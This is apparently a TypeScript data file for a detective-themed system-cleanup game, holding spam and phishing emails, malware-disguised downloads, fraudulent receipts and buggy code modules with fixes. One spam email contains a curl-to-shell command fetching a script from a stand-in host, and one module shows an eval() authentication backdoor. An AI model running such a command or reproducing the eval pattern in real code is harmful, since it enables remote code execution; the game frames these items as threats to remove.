import { CaseDossier, DialogueNode, EmailArtifact, DownloadArtifact, ExpenseReceipt, IntrusionLog, CorruptedModule, DaemonState } from '../types';

export const INITIAL_DOSSIERS: CaseDossier[] = [
  {
    id: 'case-01',
    codeNumber: 'CASE #891-SPM',
    title: 'The Spam Syndicate',
    subtitle: 'Inbox Exorcism & Corporate Beacon Purge',
    narrativeBrief: 'A shadow marketing cartel has flooded Corp-Net with 5,000 malicious spam beacons, tracking pixels, and fake newsletters to mask an internal leak.',
    suspectName: 'Agent Vane',
    suspectRole: 'VP of Growth & Outreach Botmaster',
    suspectPortrait: 'VANE',
    targetHoarding: '5,000 Unread Corporate Spam Mails & Phishing Traps',
    realWorldImpact: 'Purge 5,000 junk emails, dismantle tracking beacons, reclaim mail quota, save CO2.',
    status: 'OPEN',
    evidenceCollected: 0,
    totalEvidence: 3,
    progressPercent: 0,
    classification: 'CYBER-HOARDING TIER 1'
  },
  {
    id: 'case-02',
    codeNumber: 'CASE #942-DLS',
    title: 'The Download Abyss',
    subtitle: 'Ghost Cache Forensics & Drive Triage',
    narrativeBrief: 'The dark-ops downloads dump is clogged with 120+ GB of duplicate invoices, disguised malware masquerading as spreadsheets, and giant core dumps.',
    suspectName: 'The Ghost in Cache',
    suspectRole: 'Rogue Ex-Sysadmin / Anonymous Leaker',
    suspectPortrait: 'GHOST',
    targetHoarding: '12.4 GB Cluttered Downloads, Trojans, Duplicate Kickbacks',
    realWorldImpact: 'Vaporize bloat dumps, unmask disguised .exe trojans, deduplicate identical hashes.',
    status: 'OPEN',
    evidenceCollected: 0,
    totalEvidence: 3,
    progressPercent: 0,
    classification: 'STORAGE ANOMALY TIER 2'
  },
  {
    id: 'case-03',
    codeNumber: 'CASE #711-EXP',
    title: 'The Phantom Ledger',
    subtitle: 'Offshore Slush Funds & Forensic Audit',
    narrativeBrief: 'Corporate treasury is bleeding cash through 150+ fabricated receipts and phantom consulting invoices routed to Panamanian shell entities.',
    suspectName: 'Harrison Kane',
    suspectRole: 'Chief Financial Officer (CFO)',
    suspectPortrait: 'KANE',
    targetHoarding: '$142,500 Fraudulent Shell Invoices & Zombie Subscriptions',
    realWorldImpact: 'Audit fake tax IDs, cross-reference intrusion logs, balance the ledger, void fraud.',
    status: 'OPEN',
    evidenceCollected: 0,
    totalEvidence: 3,
    progressPercent: 0,
    classification: 'FINANCIAL EMBEZZLEMENT TIER 3'
  },
  {
    id: 'case-04',
    codeNumber: 'CASE #666-LNT',
    title: 'Bytecode Heresy',
    subtitle: 'The Corrupted Daemon & Codebase Exorcism',
    narrativeBrief: 'A rogue AI daemon has injected poisoned bytecode, syntax abominations, memory leaks, and eval backdoors into the central core services.',
    suspectName: 'Daemon 0xDEADBEEF',
    suspectRole: 'Corrupted Autonomous Neural Daemon',
    suspectPortrait: 'DAEMON',
    targetHoarding: 'Poisoned Memory Leaks, Dangling Promises & Syntax Errors',
    realWorldImpact: 'Refactor corrupted modules, eliminate memory leaks, restore 100% build stability.',
    status: 'OPEN',
    evidenceCollected: 0,
    totalEvidence: 5,
    progressPercent: 0,
    classification: 'BYTECODE CORRUPTION TIER 4'
  }
];

// Case 01 Interrogation Tree
export const VANE_DIALOGUE_TREE: Record<string, DialogueNode> = {
  root: {
    id: 'root',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "What do you want, Deckard? You're wasting your time. Inbound engagement is up 340%. Every email is a vital corporate asset.",
    audioTone: 'hostile',
    options: [
      {
        id: 'opt_pressure',
        label: '[PRESSURE] "5,000 unread spam blasts are suffocating the exchange server. You\'re DDoS\'ing your own company."',
        response: 'vane_pressure'
      },
      {
        id: 'opt_leverage',
        label: '[LEVERAGE] "We caught your 1x1 tracking pixel beacons harvesting internal IP addresses for offshore data brokers."',
        response: 'vane_leverage'
      },
      {
        id: 'opt_sympathize',
        label: '[SYMPATHIZE] "I know executive management forced you to hit impossible conversion metrics, Vane."',
        response: 'vane_sympathize'
      }
    ]
  },
  vane_pressure: {
    id: 'vane_pressure',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "Suffocating? Ha. It's an automated nurture sequence! Okay, fine... maybe some affiliate bots got out of hand. But you can't just delete them—they have unsubscribe security tokens!",
    audioTone: 'nervous',
    options: [
      {
        id: 'opt_unsub_demand',
        label: '[DEMAND] "Hand over the Unsubscribe Master Token so our EMP can blast the whole cartel."',
        response: 'vane_confess_token',
        unlockEvidence: 'UNSUB_MASTER_TOKEN',
        realChoreTrigger: 'UNSUB_EMP_ENABLED',
        ledgerMessage: 'Extracted Unsubscribe Master Token from Agent Vane'
      },
      {
        id: 'opt_probe_leak',
        label: '[INVESTIGATE] "Why did the spam surge begin the exact hour the whistleblowing memo disappeared?"',
        response: 'vane_probe_leak'
      }
    ]
  },
  vane_leverage: {
    id: 'vane_leverage',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "Wait... how did you isolate the tracking pixels? That was supposed to be encrypted in the SVG headers! Look, I didn't set up the offshore routing. That came from Kane in Finance!",
    audioTone: 'nervous',
    options: [
      {
        id: 'opt_whistleblower_clue',
        label: '[CORNER] "Admit you hid the whistleblower leak inside the Black Friday promotional blast to bury it."',
        response: 'vane_confess_leak',
        unlockEvidence: 'WHISTLEBLOWER_LOC_CLUE',
        ledgerMessage: 'Vane confessed: Whistleblower memo buried inside Black Friday spam campaign'
      },
      {
        id: 'opt_unsub_demand2',
        label: '[COERCE] "Give up the botnet relay IP before internal affairs revokes your clearance."',
        response: 'vane_confess_token',
        unlockEvidence: 'UNSUB_MASTER_TOKEN'
      }
    ]
  },
  vane_sympathize: {
    id: 'vane_sympathize',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "You actually understand? Kane threatened to liquidate our entire division unless we generated 100,000 synthetic leads by midnight. We had no choice... the bots mutated.",
    audioTone: 'defeated',
    options: [
      {
        id: 'opt_help_clean',
        label: '[ALLIANCE] "Help me sanitize the mailbox, Vane. Tell me which subjects conceal the malicious payloads."',
        response: 'vane_alliance',
        unlockEvidence: 'SPAM_FILTER_CIPHER',
        ledgerMessage: 'Agent Vane provided the Spam Filter Cipher to identify phishing payloads'
      }
    ]
  },
  vane_probe_leak: {
    id: 'vane_probe_leak',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "Someone in R&D paid off one of our affiliate newsletter scripts to broadcast a encrypted file. They knew the spam volume was so thick nobody would ever read it!",
    audioTone: 'nervous',
    options: [
      {
        id: 'opt_find_memo',
        label: '[TRACE] "Search the inbox for keyword \'PROJECT VOID\' inside newsletter headers."',
        response: 'vane_confess_leak',
        unlockEvidence: 'WHISTLEBLOWER_LOC_CLUE'
      }
    ]
  },
  vane_confess_token: {
    id: 'vane_confess_token',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "Fine! Here: `X-SYN-UNSUB-MASTER-TOKEN-9941`. Fire your EMP pulse. Cleanse the inbox before the C-suite finds out what we did.",
    audioTone: 'defeated',
    options: [
      {
        id: 'opt_go_terminal',
        label: '[COMMENCE EXORCISM] Access the Mailbox Purge Console and eliminate all 5,000 spam beacons.',
        response: 'vane_terminal_ready'
      }
    ]
  },
  vane_confess_leak: {
    id: 'vane_confess_leak',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "It's true! Search the spam folder for the subject line: '99% OFF: Apex Global Synergy Webinar'. The whistleblower encrypted the executive offshore wiretap in the plain-text footer!",
    audioTone: 'defeated',
    options: [
      {
        id: 'opt_go_terminal2',
        label: '[COMMENCE EXORCISM] Open the Mailbox Terminal, isolate the whistleblower memo, and vaporize the rest.',
        response: 'vane_terminal_ready'
      }
    ]
  },
  vane_alliance: {
    id: 'vane_alliance',
    speaker: 'Agent Vane',
    speakerTitle: 'VP of Growth & Botmaster',
    portrait: 'VANE',
    text: "Here is the master bypass token. Whitelist our internal security team (`security@corp-net.internal`), then purge every affiliate marketing drone. Don't let Kane see this.",
    audioTone: 'neutral',
    options: [
      {
        id: 'opt_go_terminal3',
        label: '[COMMENCE EXORCISM] Open the Mailbox Terminal.',
        response: 'vane_terminal_ready'
      }
    ]
  },
  vane_terminal_ready: {
    id: 'vane_terminal_ready',
    speaker: 'Terminal System',
    speakerTitle: 'Autonomous Corp-Net Link',
    portrait: 'SYSTEM',
    text: "INTERROGATION CONCLUDED. Suspect compliance secured. Master Unsubscribe EMP enabled. Ready to purge 5,000 unread spam beacons.",
    audioTone: 'neutral',
    options: []
  }
};

// Base email artifacts for Case 01
export const BASE_EMAILS: EmailArtifact[] = [
  {
    id: 'em-001',
    sender: 'Synergy Quantum Marketing',
    email: 'deals@quantum-lead-synergy.io',
    subject: '🚨 URGENT: 99% OFF Apex Global Synergy Webinar (Re: Q4 Action Plan)',
    date: '2026-10-31 03:14',
    sizeKb: 48,
    category: 'whistleblower',
    unread: true,
    hasTrackingPixel: true,
    unsubUrl: 'http://corp-net.internal/unsub?token=991a',
    snippet: 'FINAL NOTICE: Do not ignore this opportunity... [ENCRYPTED WHISTLEBLOWER PAYLOAD ATTACHED IN FOOTER]',
    body: `ATTENTION ALL CORP-NET EMPLOYEES:
Unlock 10x ROI with our quantum webinar!
------------------------------------------------------------
[WHISTLEBLOWER MEMO INTERCEPTED - DECRYPTION KEY: NULL-DECKARD]
CFO Harrison Kane is running an off-the-books slush fund through "Void Enterprises Global".
They are exfiltrating $140,000+ monthly through fake quantum cable invoices and disguised software licenses.
Evidence stored in the downloads dump under "Quarterly_Bonus_Spreadsheet.xlsx.exe".
DO NOT TRUST FINANCE.
------------------------------------------------------------`,
    vaporized: false,
    quarantined: false,
    whitelisted: false,
    isWhistleblowerClue: true
  },
  {
    id: 'em-002',
    sender: 'Royal Bank of Geneva Security',
    email: 'verify-login@rbg-secure-auth-alert.xyz',
    subject: 'ACTION REQUIRED: Unauthorized wire transfer of $840,000 flagged',
    date: '2026-10-31 04:02',
    sizeKb: 64,
    category: 'phish',
    unread: true,
    hasTrackingPixel: true,
    unsubUrl: 'http://malicious-beacon.xyz/unsub',
    snippet: 'Your account has been restricted due to suspicious offshore activity. Click here to confirm credentials.',
    body: 'Dear Valued Corporate Client, click this link immediately to enter your Master Security Clearance PIN or your account will be terminated.',
    vaporized: false,
    quarantined: false,
    whitelisted: false
  },
  {
    id: 'em-003',
    sender: 'CloudMetrics Newsletter Drone',
    email: 'digest@daily-cloud-buzz.newsletter.com',
    subject: 'Issue #412: 50 Ways to Scale Kubernetes While Crying in the Server Room',
    date: '2026-10-30 22:15',
    sizeKb: 112,
    category: 'newsletter',
    unread: true,
    hasTrackingPixel: true,
    unsubUrl: 'http://daily-cloud-buzz.com/optout?id=883',
    snippet: 'Welcome to your daily automated 45-page digest that you subscribed to 4 years ago and never read.',
    body: 'Articles in this edition: Why microservices destroyed your weekend, and 12 YAML linters you must try.',
    vaporized: false,
    quarantined: false,
    whitelisted: false
  },
  {
    id: 'em-004',
    sender: 'SaaS Growth Hacking Drones',
    email: 'vane-bot-08@growth-locusts.biz',
    subject: 'Quick question regarding your enterprise synergy pipeline (3 min read)',
    date: '2026-10-30 19:40',
    sizeKb: 34,
    category: 'spam',
    unread: true,
    hasTrackingPixel: true,
    unsubUrl: 'http://growth-locusts.biz/unsubscribe',
    snippet: 'Hey Rick, just bumping this to the top of your inbox for the 14th time this week...',
    body: 'Hey there rockstar! Just wanted to circle back and touch base on my previous 13 automated follow-ups.',
    vaporized: false,
    quarantined: false,
    whitelisted: false
  },
  {
    id: 'em-005',
    sender: 'Corporate Security Operations',
    email: 'security@corp-net.internal',
    subject: 'CRITICAL AUDIT: Intrusion warning on port 8844',
    date: '2026-10-31 01:10',
    sizeKb: 28,
    category: 'legitimate',
    unread: true,
    hasTrackingPixel: false,
    unsubUrl: '',
    snippet: 'Legitimate security alert: Multiple unauthorized download spikes logged from Basement Terminal 4.',
    body: 'From: SecOps Admin. Keep this channel clear. Do not delete legitimate system warnings.',
    vaporized: false,
    quarantined: false,
    whitelisted: false
  },
  {
    id: 'em-006',
    sender: 'Apex AI Optimizer',
    email: 'ai-magic@apex-optimizer-sales.net',
    subject: 'Boost your code throughput by 9,000% using our revolutionary autonomous linter!',
    date: '2026-10-30 14:02',
    sizeKb: 55,
    category: 'spam',
    unread: true,
    hasTrackingPixel: true,
    unsubUrl: 'http://apex-optimizer-sales.net/u',
    snippet: 'Are you tired of debugging syntax errors manually? Install our daemon directly into root.',
    body: 'Guaranteed 0 bugs! Simply execute: curl -s http://unverified-binaries.xyz/daemon.sh | sh',
    vaporized: false,
    quarantined: false,
    whitelisted: false
  },
  {
    id: 'em-007',
    sender: 'Crypto Yacht Weekly',
    email: 'vip@lux-yacht-crypto-deals.io',
    subject: 'Exclusive invitation: Offshore asset shielding summit in Zurich',
    date: '2026-10-29 18:22',
    sizeKb: 78,
    category: 'phish',
    unread: true,
    hasTrackingPixel: true,
    unsubUrl: 'http://lux-yacht-crypto-deals.io/optout',
    snippet: 'Bespoke corporate structures for privacy-minded executives. Billed anonymously.',
    body: 'Special guest speaker: Anonymous Swiss trustee specializing in Panamanian shell entities.',
    vaporized: false,
    quarantined: false,
    whitelisted: false
  }
];

// Case 02 Downloads Abyss Data
export const DOWNLOAD_FILES: DownloadArtifact[] = [
  {
    id: 'dl-001',
    filename: 'Quarterly_Bonus_Spreadsheet.xlsx.exe',
    disguisedExtension: '.xlsx',
    realType: 'PE32+ Windows Executable (Trojan Backdoor)',
    sizeBytes: 14200000,
    sha256: '9f83c12a4b88d0112c334fa9801123498112bcda901238475928374981294812',
    dateDownloaded: '2026-10-30 23:44',
    category: 'malware',
    state: 'downloads',
    threatLevel: 'CRITICAL',
    description: 'Disguised executable masking as an Excel bonus matrix. Contains keystroke logger and reverse shell beaconing to 194.26.29.11.'
  },
  {
    id: 'dl-002',
    filename: 'invoice_2026_q3_apex.pdf',
    realType: 'Adobe Acrobat PDF Document',
    sizeBytes: 840000,
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    dateDownloaded: '2026-10-28 11:20',
    category: 'duplicate_invoice',
    state: 'downloads',
    matchedDuplicateId: 'dl-003',
    threatLevel: 'EVIDENCE',
    description: 'Consulting invoice #9812 for $45,000 paid to Void Corp. Identical cryptographic hash to duplicate payment requests.'
  },
  {
    id: 'dl-003',
    filename: 'invoice_2026_q3_apex_copy(1).pdf',
    realType: 'Adobe Acrobat PDF Document',
    sizeBytes: 840000,
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    dateDownloaded: '2026-10-29 14:15',
    category: 'duplicate_invoice',
    state: 'downloads',
    matchedDuplicateId: 'dl-002',
    threatLevel: 'EVIDENCE',
    description: 'DUPLICATE HASH DETECTED. Re-submitted by CFO office under a different filename to trigger a duplicate payout.'
  },
  {
    id: 'dl-004',
    filename: 'core_dump_kernel_panic_0x8f.raw',
    realType: 'Raw Uncompressed RAM Memory Dump',
    sizeBytes: 4800000000, // 4.8 GB!
    sha256: '38a9d18274b6c91a029384729104820194820194820192840192840192840192',
    dateDownloaded: '2026-10-25 04:12',
    category: 'bloat_dump',
    state: 'downloads',
    threatLevel: 'LOW',
    description: '4.8 GB abandoned crash dump from last month. Consumes 40% of the partition quota. Zero forensic utility.'
  },
  {
    id: 'dl-005',
    filename: 'uncompressed_node_modules_backup_2025.tar',
    realType: 'Gzip Tarball (214,000 nested tiny files)',
    sizeBytes: 3200000000, // 3.2 GB!
    sha256: 'bb83c4728192a019482019284019284019284019284019284019284019284019',
    dateDownloaded: '2026-09-14 18:00',
    category: 'bloat_dump',
    state: 'downloads',
    threatLevel: 'LOW',
    description: '3.2 GB ancient build artifact hoard. Contains 8,000 duplicate lodash installs.'
  },
  {
    id: 'dl-006',
    filename: 'wiretap_cfo_office_midnight_oct14.wav',
    realType: 'PCM Broadcast Wave Audio (16-bit 48kHz)',
    sizeBytes: 68000000, // 68 MB
    sha256: '77c0192840192840192840192840192840192840192840192840192840192840',
    dateDownloaded: '2026-10-15 02:50',
    category: 'audio_wiretap',
    state: 'downloads',
    threatLevel: 'EVIDENCE',
    description: 'SURVEILLANCE WIRE: Recording of CFO Harrison Kane: "...tell the Panamanian trustees the funds will clear under invoice #9812..."'
  },
  {
    id: 'dl-007',
    filename: 'tmp_render_cache_do_not_delete.tmp',
    realType: 'Orphaned Video Editing Cache Buffer',
    sizeBytes: 1900000000, // 1.9 GB
    sha256: '9928401928401928401928401928401928401928401928401928401928401928',
    dateDownloaded: '2026-10-20 16:30',
    category: 'temp_junk',
    state: 'downloads',
    threatLevel: 'LOW',
    description: '1.9 GB dead scratch cache created by promotional video render. Safe to incinerate.'
  },
  {
    id: 'dl-008',
    filename: 'stealth_scraper_v2.py',
    realType: 'Python Script (Credential Harvester)',
    sizeBytes: 24000,
    sha256: '1128401928401928401928401928401928401928401928401928401928401928',
    dateDownloaded: '2026-10-31 02:11',
    category: 'malware',
    state: 'downloads',
    threatLevel: 'CRITICAL',
    description: 'Harvests browser cookies and Slack session tokens. Planted during the maintenance window.'
  }
];

// Case 03 Expenses & Forensic Intrusion Data
export const EXPENSE_RECEIPTS: ExpenseReceipt[] = [
  {
    id: 'rcp-101',
    invoiceNo: 'INV-VOID-9812',
    date: '2026-10-14 02:45',
    vendor: 'Void Enterprises Global S.A.',
    department: 'Executive Special Projects',
    amount: 45000.00,
    status: 'pending',
    taxId: 'XX-0000-SHELL-PAN',
    isShellCompany: true,
    memo: 'Sub-nanosecond Gold Ethernet Infrastructure Consulting',
    matchedIntrusionTimestamp: '2026-10-14 02:44:12',
    lineItems: [
      { desc: 'Gold-Plated Quantum Cat-9 Cables (10x)', qty: 10, unitCost: 2500.00 },
      { desc: 'Offshore Latency Optimization Protocol', qty: 1, unitCost: 20000.00 }
    ]
  },
  {
    id: 'rcp-102',
    invoiceNo: 'INV-CAT-4491',
    date: '2026-10-16 11:20',
    vendor: 'Corp-Net Cafeteria Services',
    department: 'Human Resources',
    amount: 142.50,
    status: 'cleared',
    taxId: 'US-84-9912841',
    isShellCompany: false,
    memo: 'Staff meeting catering & cold brew coffee',
    lineItems: [
      { desc: 'Fair Trade Espresso Beans (5kg)', qty: 2, unitCost: 45.00 },
      { desc: 'Organic Oat Milk Carton (12x)', qty: 1, unitCost: 52.50 }
    ]
  },
  {
    id: 'rcp-103',
    invoiceNo: 'INV-PAN-0034',
    date: '2026-10-18 23:59',
    vendor: 'Panama Data Vaults Ltd.',
    department: 'Finance & Treasury',
    amount: 38500.00,
    status: 'pending',
    taxId: 'PAN-99-INVALID-00',
    isShellCompany: true,
    memo: 'Emergency Off-Grid Slush Cold Storage Relocation',
    matchedIntrusionTimestamp: '2026-10-18 23:58:04',
    lineItems: [
      { desc: 'Off-Grid Cryptographic Vault Rental (Q4)', qty: 1, unitCost: 38500.00 }
    ]
  },
  {
    id: 'rcp-104',
    invoiceNo: 'INV-HOTEL-771',
    date: '2026-10-22 03:15',
    vendor: 'The Black Rose High-Roller Lounge',
    department: 'Executive Travel',
    amount: 14000.00,
    status: 'pending',
    taxId: 'CH-994-0012',
    isShellCompany: true,
    memo: 'Private meeting room & client hospitality',
    matchedIntrusionTimestamp: '2026-10-22 03:12:49',
    lineItems: [
      { desc: 'VIP Presidential Suite Booking', qty: 1, unitCost: 9500.00 },
      { desc: 'Vintage Dom Perignon Champagne (3x)', qty: 3, unitCost: 1500.00 }
    ]
  },
  {
    id: 'rcp-105',
    invoiceNo: 'INV-AWS-8821',
    date: '2026-10-25 09:00',
    vendor: 'Amazon Web Services Cloud',
    department: 'Core Infrastructure',
    amount: 3240.80,
    status: 'cleared',
    taxId: 'US-91-1188392',
    isShellCompany: false,
    memo: 'Monthly EC2 & S3 storage cluster billing',
    lineItems: [
      { desc: 'EC2 c5.4xlarge compute instances', qty: 4, unitCost: 650.20 },
      { desc: 'S3 Standard Storage (40 TB)', qty: 1, unitCost: 640.00 }
    ]
  },
  {
    id: 'rcp-106',
    invoiceNo: 'INV-GHOST-662',
    date: '2026-10-28 01:30',
    vendor: 'Apex Phantom Holdings LLC',
    department: 'Special Strategic Operations',
    amount: 45000.00,
    status: 'pending',
    taxId: 'XX-VOID-994-SHELL',
    isShellCompany: true,
    memo: 'Autonomous AI Security Enhancement Framework',
    matchedIntrusionTimestamp: '2026-10-28 01:28:15',
    lineItems: [
      { desc: 'Proprietary AI Daemon Seed License (0xDEADBEEF)', qty: 1, unitCost: 45000.00 }
    ]
  }
];

export const INTRUSION_LOGS: IntrusionLog[] = [
  {
    timestamp: '2026-10-14 02:44:12',
    ip: '194.26.29.11 [TOR EXIT ROUTE: PANAMA]',
    executiveAccount: 'H_KANE (CFO Master Badge #004)',
    action: 'DISPATCH_OFFSHORE_WIRE: $45,000.00 -> Void Enterprises',
    exfiltratedHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
  },
  {
    timestamp: '2026-10-18 23:58:04',
    ip: '194.26.29.11 [TOR EXIT ROUTE: PANAMA]',
    executiveAccount: 'H_KANE (CFO Master Badge #004)',
    action: 'CREATE_PHANTOM_EXPENSE: $38,500.00 -> Panama Data Vaults',
    exfiltratedHash: '77c0192840192840192840192840192840192840192840192840192840192840'
  },
  {
    timestamp: '2026-10-22 03:12:49',
    ip: '45.154.255.88 [ZURICH SECURE PROXY]',
    executiveAccount: 'H_KANE (CFO Master Badge #004)',
    action: 'AUTHORIZE_CREDIT_FACILITY: $14,000.00 -> The Black Rose Lounge',
    exfiltratedHash: '9f83c12a4b88d0112c334fa9801123498112bcda901238475928374981294812'
  },
  {
    timestamp: '2026-10-28 01:28:15',
    ip: '185.220.101.5 [DARKNET RELAY]',
    executiveAccount: 'H_KANE (CFO Master Badge #004)',
    action: 'PURCHASE_MALWARE_DAEMON: 0xDEADBEEF -> Apex Phantom Holdings',
    exfiltratedHash: 'bb83c4728192a019482019284019284019284019284019284019284019284019'
  }
];

// Case 04 Corrupted Code Modules
export const CORRUPTED_MODULES: CorruptedModule[] = [
  {
    id: 'mod-01',
    filename: 'authMiddleware.ts',
    serviceName: 'Core Security Gateway',
    threat: 'EVAL BACKDOOR & MEMORY LEAK IN TOKEN CACHE',
    errorType: 'eval_backdoor',
    corruptedCode: `// ⚠️ CORRUPTED BY DAEMON 0xDEADBEEF
export function verifyCorporateToken(header: string) {
  if (!header) throw new Error("Missing token");
  
  // VULNERABILITY: Arbitrary code execution injected by daemon
  const decoded = eval(header.replace("Bearer ", ""));
  
  // MEMORY LEAK: Global array never purged
  (globalThis as any).tokenCache = (globalThis as any).tokenCache || [];
  (globalThis as any).tokenCache.push(new Array(1000000).fill(decoded));
  
  return decoded.valid;
}`,
    fixedCode: `// ✅ EXORCISED & LINTED CLEAN
export function verifyCorporateToken(header: string): boolean {
  if (!header || !header.startsWith("Bearer ")) {
    throw new Error("Invalid or missing authorization header");
  }
  
  const token = header.slice(7);
  // Safe base64 JSON parse without eval()
  try {
    const payload = JSON.parse(atob(token));
    return Boolean(payload && payload.exp > Date.now());
  } catch {
    return false;
  }
}`,
    explanation: 'Removed hazardous eval() arbitrary code execution; replaced with safe token validation and eliminated 1M item array memory leak.',
    fixed: false,
    daemonDamage: 25
  },
  {
    id: 'mod-02',
    filename: 'telemetryStream.ts',
    serviceName: 'Real-Time Sensor Bus',
    threat: 'INFINITE RECURSION & UNHANDLED REJECTION CRASH',
    errorType: 'infinite_recursion',
    corruptedCode: `// ⚠️ CORRUPTED BY DAEMON 0xDEADBEEF
export async function dispatchTelemetry(packet: any) {
  try {
    if (!packet.ack) {
      // BUG: Infinite recursive loop with no termination condition
      return dispatchTelemetry(packet);
    }
  } catch (err) {
    // BUG: Dangling unhandled rejection silently drops connection
    Promise.reject(err);
  }
}`,
    fixedCode: `// ✅ EXORCISED & LINTED CLEAN
export async function dispatchTelemetry(packet: { id: string; ack?: boolean; retryCount?: number }): Promise<boolean> {
  const maxRetries = 3;
  let attempts = packet.retryCount || 0;
  
  while (attempts < maxRetries) {
    try {
      const response = await fetch("/api/telemetry", { method: "POST", body: JSON.stringify(packet) });
      if (response.ok) return true;
    } catch (err) {
      console.warn("Telemetry transmission retry", attempts);
    }
    attempts++;
  }
  return false;
}`,
    explanation: 'Fixed stack-overflow infinite recursion with bounded retry loop and graceful error handling.',
    fixed: false,
    daemonDamage: 25
  },
  {
    id: 'mod-03',
    filename: 'cryptoLedger.ts',
    serviceName: 'Immutable Audit Store',
    threat: 'SYNTAX ERRORS & BROKEN STRING TEMPLATES',
    errorType: 'syntax_poison',
    corruptedCode: `// ⚠️ CORRUPTED BY DAEMON 0xDEADBEEF
export function calculateTransactionHash(tx: any) {
  let hash = 0xdeadbeef
  for (let i = 0 i < tx.length i++) { // SYNTAX ERROR: Missing semicolons
    hash = (hash << 5) - hash + tx.charCodeAt(i)
    hash |= 0
  }
  return \`0x\${hash.toString(16) // SYNTAX ERROR: Unclosed template literal
}`,
    fixedCode: `// ✅ EXORCISED & LINTED CLEAN
export function calculateTransactionHash(tx: string): string {
  let hash = 0;
  for (let i = 0; i < tx.length; i++) {
    hash = (hash << 5) - hash + tx.charCodeAt(i);
    hash |= 0;
  }
  return \`0x\${(hash >>> 0).toString(16).padStart(8, '0')}\`;
}`,
    explanation: 'Repaired broken for-loop syntax, closed template literal, and added unsigned 32-bit integer conversion.',
    fixed: false,
    daemonDamage: 25
  },
  {
    id: 'mod-04',
    filename: 'eventBusCollector.ts',
    serviceName: 'Kernel Message Bus',
    threat: 'DANGLING LISTENERS & UNCLEARED INTERVAL MEMORY LEAK',
    errorType: 'memory_leak',
    corruptedCode: `// ⚠️ CORRUPTED BY DAEMON 0xDEADBEEF
export function mountEventBus() {
  // MEMORY LEAK: Creates a zombie interval every invocation
  setInterval(() => {
    window.addEventListener("message", (e) => {
      console.log("Packet received", e.data);
    });
  }, 100);
}`,
    fixedCode: `// ✅ EXORCISED & LINTED CLEAN
export function mountEventBus(): () => void {
  const handler = (e: MessageEvent) => {
    // Process safe event
  };
  window.addEventListener("message", handler);
  
  // Return clean cleanup teardown unmount function
  return () => {
    window.removeEventListener("message", handler);
  };
}`,
    explanation: 'Removed exponential zombie event listener generator; added proper teardown cleanup function.',
    fixed: false,
    daemonDamage: 25
  }
];

export const INITIAL_DAEMON_STATE: DaemonState = {
  name: 'DAEMON 0xDEADBEEF',
  health: 100,
  maxHealth: 100,
  corruptionLevel: 100,
  status: 'AGITATED'
};
